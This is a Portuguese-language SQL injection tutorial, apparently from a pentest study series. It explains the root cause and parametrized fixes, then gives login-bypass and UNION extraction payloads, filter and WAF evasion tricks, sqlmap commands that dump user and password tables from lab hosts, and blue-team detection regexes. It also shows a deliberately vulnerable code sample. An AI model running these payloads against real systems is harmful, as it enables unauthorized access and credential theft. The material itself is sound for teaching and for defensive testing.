---
title: "SQLi Fundamentals"
---

# SQL Injection - Fundamentos

## A Falha: Dados do Usuário Interpretados como Comandos SQL

SQL Injection existe por uma razão fundamental: o banco de dados recebe instruções em formato de texto, e quando a aplicação constrói esse texto concatenando strings com input do usuário, o banco não tem como distinguir o que era intenção do desenvolvedor e o que foi inserido pelo usuário. Para o interpretador SQL, tudo é código — não existe separação entre "dados" e "comandos" quando ambos chegam misturados numa mesma string.

A suposição de design errada é simples: o desenvolvedor assume que o input será sempre o dado esperado. Ele escreve `"SELECT * FROM users WHERE username = '" + username + "'"` pensando que `username` será algo como `"admin"`. O que não considera é que o usuário pode enviar `"admin' OR '1'='1"` — e o banco vai processar esse texto como código SQL válido, porque é exatamente isso que é.

O desenvolvedor cria essa falha sem perceber porque o código "funciona" durante o desenvolvimento: os testes são feitos com inputs normais, nada quebra, e a feature é entregue. A vulnerabilidade só se manifesta quando alguém envia deliberadamente um input com caracteres que têm significado especial em SQL — aspas simples, hifens duplos, ponto-e-vírgula. Esses caracteres "vazam" da camada de dados para a camada de sintaxe SQL.

A consequência real é grave antes mesmo de ver a exploração: qualquer query que a aplicação executa pode ser modificada pelo atacante. Isso inclui queries de autenticação (login bypass), queries de busca (extração de dados), e em certos bancos como MSSQL, até execução de comandos no sistema operacional via stored procedures como `xp_cmdshell`.

---

## Causa Raiz

O código vulnerável monta a query por concatenação de string, tratando o input como parte confiável da instrução SQL:

```python
# VULNERÁVEL — input do usuário entra diretamente na query
username = request.args.get('username')
query = "SELECT * FROM users WHERE username = '" + username + "'"
db.execute(query)
```

O que está faltando é a separação entre a estrutura da query e os dados. A forma correta usa **prepared statements** (queries parametrizadas), onde o banco de dados recebe a estrutura da query separada dos dados — e os dados nunca são interpretados como código:

```python
# SEGURO — dados separados da estrutura SQL
username = request.args.get('username')
query = "SELECT * FROM users WHERE username = ?"
db.execute(query, (username,))
```

Com prepared statements, enviar `"admin' OR '1'='1"` como username resultaria em buscar literalmente um usuário com esse nome exato — o banco trata como string, não como código SQL. O que está faltando na versão vulnerável é parametrização: o desenvolvedor não separou a intenção do código (a estrutura SQL) dos dados (o input do usuário).

---

## Mecanismo de Injeção: Input do Usuário na Sintaxe SQL

### Estrutura de uma Query SQL Vulnerável

O banco recebe queries em texto. Quando input do usuário é inserido diretamente na query, o atacante pode fechar a query original e injetar SQL arbitrário.

```sql
-- Query legítima
SELECT * FROM users WHERE username = 'admin' AND password = 'senha123';

-- Com injeção: username = admin' OR '1'='1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'qualquer';
-- Resultado: retorna todos os usuários (bypass de login)
```

### Operadores Lógicos SQL

```sql
-- AND: ambas condições verdadeiras
SELECT * FROM logins WHERE username='admin' AND id > 1;

-- OR: pelo menos uma verdadeira
SELECT * FROM logins WHERE username='admin' OR '1'='1';

-- NOT: nega a condição
SELECT * FROM logins WHERE NOT username='john';
```

### Tipos de SQL Injection

| Tipo | Subtipo | Descrição |
|------|---------|-----------|
| In-band | UNION-based | Usa UNION para retornar dados na mesma resposta |
| In-band | Error-based | Extrai dados via mensagens de erro |
| Blind | Boolean-based | Faz perguntas true/false baseando-se no comportamento da app |
| Blind | Time-based | Usa delays para inferir true/false |
| Out-of-Band | DNS exfil | Força servidor a fazer requisição DNS com dados codificados |

---

## Identificação e Discovery

O primeiro teste é injetar um caractere que quebre a sintaxe SQL. O mais comum é aspas simples `'`.

**Payloads de descoberta:**
```
'
"
`
')
")
`)
' --
" --
-- -
#
/*
;
```

**Comportamentos que indicam vulnerabilidade:**
- Erro de SQL na página (`You have an error in your SQL syntax`)
- Comportamento diferente entre `'` e `''`
- Conteúdo duplicado ou ausente na página
- Delay na resposta (para time-based)

### Comentários SQL por DBMS

Comentários são usados para remover o restante da query original após a injeção:

| DBMS | Comentários Suportados |
|------|----------------------|
| MySQL | `-- -`, `#`, `/*comentário*/` |
| MSSQL | `--`, `/*comentário*/` |
| PostgreSQL | `--`, `/*comentário*/` |
| Oracle | `--`, `/*comentário*/` |

```sql
-- Exemplo: remover AND password='x' da query
admin'-- -
-- Resultado: SELECT * FROM users WHERE username='admin'-- -' AND password='x'
-- Tudo após -- é comentário, password check ignorado
```

---

## Exploitation

### Bypass de Autenticação

O objetivo é fazer a condição WHERE retornar TRUE para qualquer usuário.

```sql
-- Payload no campo username
admin' OR '1'='1
-- Query resultante:
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='qualquer'
-- '1'='1' é sempre true

-- Payload para ignorar password completamente
admin'-- -
-- Query resultante:
SELECT * FROM users WHERE username='admin'-- - AND password='qualquer'

-- Com parênteses (quando query tem grouping)
admin')-- -
-- Query resultante:
SELECT * FROM users WHERE (username='admin')-- - AND password='qualquer'

-- Login como primeiro usuário sem saber o username
' OR '1'='1
-- Retorna o primeiro registro da tabela

-- Login como primeiro usuário com comentário
' OR '1'='1'-- -
```

### URL Encoding dos Payloads

Quando injetando via URL/GET params, alguns caracteres precisam ser encoded:

| Caractere | URL Encoded |
|-----------|------------|
| Espaço | `%20` ou `+` |
| `'` | `%27` |
| `"` | `%22` |
| `#` | `%23` |
| `;` | `%3B` |
| `=` | `%3D` |

### UNION-Based Injection

UNION permite combinar resultados de duas queries. Requisitos:
1. Número de colunas deve ser igual
2. Tipos de dados das colunas devem ser compatíveis

**Passo 1: Descobrir número de colunas**

```sql
-- Método ORDER BY (incrementar até erro)
' ORDER BY 1-- -   -- sem erro
' ORDER BY 2-- -   -- sem erro
' ORDER BY 3-- -   -- sem erro
' ORDER BY 4-- -   -- ERRO: coluna 4 não existe, logo temos 3 colunas

-- Método UNION NULL (adicionar NULLs até funcionar)
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -   -- funciona = 3 colunas
```

**Passo 2: Identificar colunas de texto**

```sql
-- Testar qual coluna aceita string
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,'a'-- -
```

**Passo 3: Extrair dados**

```sql
-- Versão do banco
' UNION SELECT version(),NULL,NULL-- -

-- Banco atual
' UNION SELECT database(),NULL,NULL-- -        -- MySQL
' UNION SELECT DB_NAME(),NULL,NULL-- -         -- MSSQL
' UNION SELECT current_database(),NULL,NULL-- - -- PostgreSQL

-- Usuário atual
' UNION SELECT user(),NULL,NULL-- -            -- MySQL
' UNION SELECT system_user,NULL,NULL-- -       -- MSSQL
' UNION SELECT current_user,NULL,NULL-- -      -- PostgreSQL
```

**Enumeração via information_schema (MySQL/PostgreSQL/MSSQL):**

```sql
-- Listar bancos de dados
' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata-- -

-- Listar tabelas de um banco
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='alvo'-- -

-- Listar colunas de uma tabela
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -

-- Extrair dados
' UNION SELECT username,password,NULL FROM users-- -

-- Concatenar múltiplas colunas em uma (quando só 1 coluna de string disponível)
' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users-- -   -- MySQL
' UNION SELECT username||':'||password,NULL,NULL FROM users-- -          -- PostgreSQL
```

### Diferenças de Sintaxe por DBMS

| Operação | MySQL | MSSQL | PostgreSQL | Oracle |
|----------|-------|-------|------------|--------|
| Concatenar | `CONCAT(a,b)` ou `a||b` | `a+b` | `a||b` | `a||b` |
| Substring | `SUBSTRING(s,1,3)` | `SUBSTRING(s,1,3)` | `SUBSTRING(s,1,3)` | `SUBSTR(s,1,3)` |
| Length | `LENGTH(s)` | `LEN(s)` | `LENGTH(s)` | `LENGTH(s)` |
| Versão | `version()` | `@@version` | `version()` | `v$version` |
| Banco atual | `database()` | `DB_NAME()` | `current_database()` | - |
| Usuário atual | `user()` | `system_user` | `current_user` | `user` |
| Tabelas | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `all_tables` |
| Sleep | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `pg_sleep(5)` | `dbms_pipe.receive_message('x',5)` |
| Comentário | `--` ou `#` | `--` | `--` | `--` |

### Enumeração Completa - Cheatsheet

```sql
-- === MySQL / MariaDB ===
-- Bancos disponíveis
SELECT schema_name FROM information_schema.schemata;

-- Tabelas do banco 'alvo'
SELECT table_name FROM information_schema.tables WHERE table_schema='alvo';

-- Colunas da tabela 'users' no banco 'alvo'
SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='alvo';

-- Tudo de uma vez (concatenado)
SELECT CONCAT(username,0x3a,password) FROM alvo.users;
-- 0x3a = ':' em hex

-- === MSSQL ===
-- Bancos
SELECT name FROM master.dbo.sysdatabases;
-- ou
SELECT name FROM sys.databases;

-- Tabelas
SELECT table_name FROM information_schema.tables WHERE table_catalog='alvo';

-- Colunas
SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_catalog='alvo';

-- === PostgreSQL ===
-- Schemas
SELECT schema_name FROM information_schema.schemata;

-- Tabelas
SELECT table_name FROM information_schema.tables WHERE table_schema='public';

-- Colunas
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

---

## Bypass de Proteções

### Técnicas de Bypass Manual

```sql
-- Bypass de filtro de espaços
-- Comentários como espaço
SELECT/**/username/**/FROM/**/users
-- Tab e newlines
SELECT%09username%0AFROM%0Dusers

-- Bypass de filtro de palavras-chave (case insensitive)
sElEcT * fRoM users
SELECT * FROM users -- keywords são case-insensitive em SQL

-- Bypass de filtro que remove 'SELECT'
SESELECTLECT * FROM users
-- Se o filtro remover SELECT uma vez, resta SELECT

-- Comentários inline dentro de keywords
SEL/**/ECT * FROM users -- não funciona em todos DBMS

-- Double URL encoding
%2527 = %27 = '  (decodifica duas vezes)
```

### Bypassando WAF com SQLMap

```bash
# Lista de tampers combinados para WAF genérico
sqlmap -u "http://alvo.htb/vuln?id=1" \
  --tamper=between,charencode,charunicodeencode,equaltolike,greatest,\
randomcase,space2comment,space2dash,space2morecomment,space2randomblank \
  --level=5 --risk=3 --random-agent

# Usando user-agent aleatório (evitar bloqueio por UA)
sqlmap -u "http://alvo.htb/vuln?id=1" --random-agent

# Delay entre requests para evitar rate limiting
sqlmap -u "http://alvo.htb/vuln?id=1" --delay=2
```

---

## Ferramentas

### SQLMap - Uso Básico

SQLMap automatiza detecção e exploração de SQLi.

```bash
# Teste básico em parâmetro GET
sqlmap -u "http://alvo.htb/search?q=1"

# Com cookie de sessão
sqlmap -u "http://alvo.htb/search?q=1" --cookie="session=abc123"

# Parâmetro POST
sqlmap -u "http://alvo.htb/login" --data="username=admin&password=test"

# Especificar parâmetro injetável
sqlmap -u "http://alvo.htb/search?q=1&page=2" -p q

# Salvar request do Burp e usar como base
sqlmap -r request.txt

# Fingerprint do banco
sqlmap -u "http://alvo.htb/search?q=1" --banner --current-user --current-db --is-dba

# Enumerar tabelas
sqlmap -u "http://alvo.htb/search?q=1" --tables -D nome_banco

# Dump de tabela específica
sqlmap -u "http://alvo.htb/search?q=1" --dump -T users -D nome_banco

# Dump de colunas específicas
sqlmap -u "http://alvo.htb/search?q=1" --dump -T users -D nome_banco -C "username,password"

# Dump tudo (exceto bancos de sistema)
sqlmap -u "http://alvo.htb/search?q=1" --dump-all --exclude-sysdbs

# Listar todos os bancos
sqlmap -u "http://alvo.htb/search?q=1" --dbs

# Schema completo
sqlmap -u "http://alvo.htb/search?q=1" --schema

# Buscar tabela por nome
sqlmap -u "http://alvo.htb/search?q=1" --search -T user

# Buscar coluna por nome
sqlmap -u "http://alvo.htb/search?q=1" --search -C pass

# Paginação dos resultados
sqlmap -u "http://alvo.htb/search?q=1" --dump -T users --start=2 --stop=5

# Filtro WHERE
sqlmap -u "http://alvo.htb/search?q=1" --dump -T users --where="username LIKE 'a%'"

# Tentar crack de hashes automaticamente
sqlmap -u "http://alvo.htb/search?q=1" --dump -T users --passwords
```

### SQLMap - Tuning Avançado

```bash
# Aumentar agressividade (detecta mais, mais lento)
sqlmap -u "http://alvo.htb/search?q=1" --level=5 --risk=3

# Especificar técnicas (B=boolean, E=error, U=union, S=stacked, T=time, Q=inline)
sqlmap -u "http://alvo.htb/search?q=1" --technique=BEUSTQ

# Usar tamper scripts para WAF bypass
sqlmap -u "http://alvo.htb/search?q=1" --tamper=space2comment
sqlmap -u "http://alvo.htb/search?q=1" --tamper=between,randomcase,space2comment

# Forçar número de colunas UNION
sqlmap -u "http://alvo.htb/search?q=1" --union-cols=6

# Adicionar prefix/suffix para ajustar payload
sqlmap -u "http://alvo.htb/search?q=1" --prefix="'" --suffix="-- -"

# Usar proxy (Burp)
sqlmap -u "http://alvo.htb/search?q=1" --proxy="http://127.0.0.1:8080"

# Debug completo
sqlmap -u "http://alvo.htb/search?q=1" -v 6

# Parsear erros da resposta
sqlmap -u "http://alvo.htb/search?q=1" --parse-errors

# Salvar log
sqlmap -u "http://alvo.htb/search?q=1" -t /tmp/sqli.log

# Threads para acelerar
sqlmap -u "http://alvo.htb/search?q=1" --threads=10

# Forçar DBMS para pular fingerprint
sqlmap -u "http://alvo.htb/search?q=1" --dbms=mysql
```

### Tamper Scripts Úteis

| Tamper Script | O Que Faz |
|---------------|-----------|
| `space2comment` | Substitui espaços por `/**/` |
| `between` | `>` vira `NOT BETWEEN 0 AND` |
| `randomcase` | `SELECT` vira `SeLeCt` |
| `charencode` | URL-encode de caracteres |
| `base64encode` | Encode em base64 |
| `modsecurityversioned` | Bypass ModSecurity |
| `unmagicquotes` | Bypass magic quotes PHP |
| `equaltolike` | `=` vira `LIKE` |

---

## Detecção e Mitigação

### Indicadores de WAF Presente

- Resposta 403 em payloads que causariam erro de SQL
- Páginas de bloqueio ("suspicious activity detected")
- Diferença de resposta apenas para payloads com palavras-chave SQL
- Rate limiting agressivo após alguns requests

### Detecção por Analistas (Blue Team)

Padrões que indicam SQLi em logs:
```
' OR '1'='1
UNION SELECT
information_schema
WAITFOR DELAY
pg_sleep
-- -
0x
```

Regras SIEM/WAF para detectar:
```regex
# Detecção de payloads comuns
(?i)(union.*select|select.*from|insert.*into|drop.*table|waitfor.*delay)
(?i)('|%27|%22).*(or|and).*(1=1|'1'='1'|1--|\bor\b)
```

### Mitigação

A única correção efetiva é usar prepared statements (queries parametrizadas) em toda interação com o banco. Validação de input no lado do cliente ou filtros baseados em blacklist de caracteres são controles secundários e frequentemente bypassáveis — como visto nas técnicas de WAF bypass. A proteção principal deve estar na separação estrutural entre código SQL e dados do usuário.

---

## Módulos Relacionados

Os fundamentos de SQLi cobertos aqui são pré-requisito direto para [`02_sqli_blind_e_avancado.md`](02_sqli_blind_e_avancado.md), que trata dos casos onde a aplicação não retorna dados diretamente mas revela comportamento via booleanos ou delays. Para automação de detecção e exploração de todos os tipos de SQLi, ver [`03_sqlmap.md`](03_sqlmap.md). Técnicas para contornar mecanismos de filtragem e WAFs que bloqueiam os payloads descritos aqui estão em [`05_sqli_waf_bypass.md`](05_sqli_waf_bypass.md).
